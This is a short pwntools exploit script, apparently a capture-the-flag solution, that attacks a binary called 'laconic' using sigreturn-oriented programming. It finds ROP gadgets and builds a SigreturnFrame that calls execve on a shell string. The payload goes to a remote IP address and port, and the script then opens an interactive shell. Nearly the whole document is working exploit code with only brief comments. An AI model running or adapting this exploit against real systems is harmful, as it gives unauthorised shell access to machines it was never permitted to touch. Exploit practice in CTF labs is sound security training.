# SIGRETURN https://sharkmoos.medium.com/a-quick-demonstration-of-sigreturn-oriented-programming-d9ae98c3ab0e

from pwn import *

mode = "REMOTE"
p = None

bin_name = "./laconic"
elf = ELF(bin_name)
context.binary = elf

rop = ROP(elf)

pop_rax = rop.find_gadget(['pop rax', 'ret']).address
syscall = rop.find_gadget(['syscall', 'ret']).address
binsh   = 0x43238
# First call call syscall 0 => read
# padding de 8 => overwrite ret

syscall_execve = 59

if mode == "DEBUG":
  p = gdb.debug(bin_name, """
              b *0x43000
""")
if mode == "EXEC":
  p = process(bin_name)
if mode == "REMOTE":
  p = remote("94.237.61.218", 53308)


# execve("sh")
# eax = 59
# rdi = @sh
# rsi = 0
# rdx = 0


frame = SigreturnFrame()
frame.rax = 59 # syscall code for execve
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0xdeadbeef # so we can find it easily
frame.rip = syscall # When the signal context is returned to registers
p.send(flat(
    p64(0xdeadbeeef),
    pop_rax,
    0xf,
    syscall, 
    bytes(frame)
    ))
p.interactive()
